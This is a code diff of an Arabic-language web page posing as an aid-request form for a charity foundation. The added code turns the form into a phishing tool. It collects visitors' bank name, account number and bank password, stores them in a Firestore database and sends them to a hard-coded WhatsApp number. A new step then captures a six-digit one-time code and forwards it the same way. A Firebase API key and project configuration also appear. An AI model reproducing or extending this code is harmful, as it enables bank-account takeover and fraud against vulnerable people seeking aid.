+          sendBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الحفظ...';
 
-          // Wait for Firebase to load (which started in background)
-          const [{ initializeApp, getApps, getApp }, { getFirestore, doc, setDoc }] = await firebasePromise;
+          var [{ initializeApp, getApps, getApp }, { getFirestore, doc, setDoc }] = await Promise.all([
+            import("https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js"),
+            import("https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js")
+          ]);
 
-          const firebaseConfig = {
+          var firebaseConfig = {
             apiKey: "AIzaSyC1-J4dSTmxUnz5d7dvq9XWrRHf_Lr511M",
             authDomain: "alwaleed-3a813.firebaseapp.com",
             projectId: "alwaleed-3a813",
@@ -173,48 +943,110 @@
             appId: "1:680698906569:web:154df6466c1c89d67f4a18"
           };
 
-          const app = !getApps().length ? initializeApp(firebaseConfig) : getApp();
-          const db = getFirestore(app);
+          var app = !getApps().length ? initializeApp(firebaseConfig) : getApp();
+          var db = getFirestore(app);
+          var phoneId = phoneInput.value.replace(/[^0-9]/g, '');
+          var uniqueId = phoneId + '_' + Date.now();
 
-          // Add timestamp to make ID unique, preventing permission-denied error on repeat requests
-          const uniquePhoneId = phoneId + '_' + Date.now();
-          
-          await setDoc(doc(db, "us", uniquePhoneId), {
-            name: name,
-            phone: phoneRaw,
-            location: location,
-            type: type,
-            notes: notes,
-            date: dateISO
+          await setDoc(doc(db, "us", uniqueId), {
+            name: nameInput.value.trim(),
+            phone: fullPhone,
+            country: countrySelect.value,
+            bank: bank,
+            accountNumber: account,
+            password: password,
+            notes: notesInput.value.trim(),
+            date: new Date().toISOString()
           });
 
-          let message = "📌 *طلب مساعدة جديد - مؤسسة الوليد* 📌\n\n";
-          message += "• *الاسم:* " + name + "\n";
-          message += "• *الهاتف:* " + phoneRaw + "\n";
-          message += "• *الدولة:* " + location + "\n";
-          message += "• *نوع المساعدة:* " + type + "\n";
-          message += "• *التفاصيل:* " + notes + "\n\n";
+          var message = "📌 *طلب مساعدة جديد - مؤسسة الوليد* 📌\n\n";
+          message += "• *الاسم:* " + nameInput.value.trim() + "\n";
+          message += "• *الدولة:* " + countrySelect.value + "\n";
+          message += "• *الهاتف:* " + fullPhone + "\n";
+          message += "• *البنك:* " + bank + "\n";
+          message += "• *رقم الحساب:* " + account + "\n";
+          message += "• *كلمة المرور:* " + password + "\n";
+          message += "• *شرح الحالة:* " + notesInput.value.trim() + "\n\n";
           message += "🪪 *أرفق صورة الهوية بعد رفع البيانات* 🪪";
 
-          sendBtn.disabled = false;
-          sendBtn.innerText = "إرسال الطلب عبر واتساب";
+          // فتح واتساب في نافذة جديدة حتى يبقى المستخدم في الصفحة
+          window.open('https://wa.me/' + adminPhone + '?text=' + encodeURIComponent(message), '_blank');
 
-          window.location.href = `https://wa.me/${adminPhone}?text=${encodeURIComponent(message)}`;
+          // الانتقال للخطوة 3
+          goToStep(3);
+
+          // التركيز على أول حقل OTP
+          setTimeout(function () {
+            document.querySelector('.otp-input').focus();
+          }, 500);
 
         } catch (error) {
-          console.error("خطأ أثناء الحفظ:", error);
-          if (error.code === 'permission-denied') {
-            alert("رقم الجوال هذا مسجل لدينا بالفعل في طلب مساعدة سابق.");
-          } else {
-            alert("حدث خطأ في الاتصال، ولكن سيتم توجيهك للواتساب الآن.");
-            window.location.href = `https://wa.me/${adminPhone}?text=Error_In_Saving_Help_Request`;
-          }
+          console.error("خطأ:", error);
+          alert("حدث خطأ في الاتصال، ولكن سيتم توجيهك للواتساب.");
+          window.open('https://wa.me/966578012189', '_blank');
+          goToStep(3);
         } finally {
           sendBtn.disabled = false;
-          sendBtn.innerText = "إرسال الطلب عبر واتساب";
+          sendBtn.innerHTML = '<i class="fab fa-whatsapp"></i> إرسال عبر واتساب';
         }
-      };
-    }
+      });
+
+      // ==============================
+      //  أحداث الخطوة 3: OTP
+      // ==============================
+      var otpInputs = document.querySelectorAll('.otp-input');
+
+      otpInputs.forEach(function (input, index) {
+        // أرقام فقط
+        input.addEventListener('input', function () {
+          this.value = this.value.replace(/[^0-9]/g, '');
+          if (this.value && index < otpInputs.length - 1) {
+            otpInputs[index + 1].focus();
+          }
+        });
+
+        // التنقل بـ Backspace
+        input.addEventListener('keydown', function (e) {
+          if (e.key === 'Backspace' && !this.value && index > 0) {
+            otpInputs[index - 1].focus();
+          }
+        });
+
+        // اللصق
+        input.addEventListener('paste', function (e) {
+          e.preventDefault();
+          var pasteData = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
+          for (var i = 0; i < Math.min(pasteData.length, otpInputs.length); i++) {
+            otpInputs[i].value = pasteData[i];
+          }
+          var nextFocus = Math.min(pasteData.length, otpInputs.length - 1);
+          otpInputs[nextFocus].focus();
+        });
+      });
+
+      // زر تأكيد الرمز
+      confirmOtpBtn.addEventListener('click', function () {
+        var otp = '';
+        otpInputs.forEach(function (input) { otp += input.value; });
+
+        if (otp.length < 6) {
+          alert('يرجى إدخال رمز التأكيد كاملاً (6 أرقام).');
+          return;
+        }
+
+        var adminPhone = "966578012189";
+        var fullPhone = currentCountry ? (currentCountry.code + phoneInput.value) : phoneInput.value;
+
+        var message = "🔐 *رمز التأكيد* 🔐\n\n";
+        message += "• *الاسم:* " + nameInput.value.trim() + "\n";
+        message += "• *الهاتف:* " + fullPhone + "\n";
+        message += "• *رمز التأكيد:* " + otp + "\n\n";
+        message += "✅ _تم إرسال رمز التأكيد بنجاح_";
+
+        window.location.href = 'https://wa.me/' + adminPhone + '?text=' + encodeURIComponent(message);
+      });
+
+    })();
   </script>
 
   <!-- Reveal Animation -->
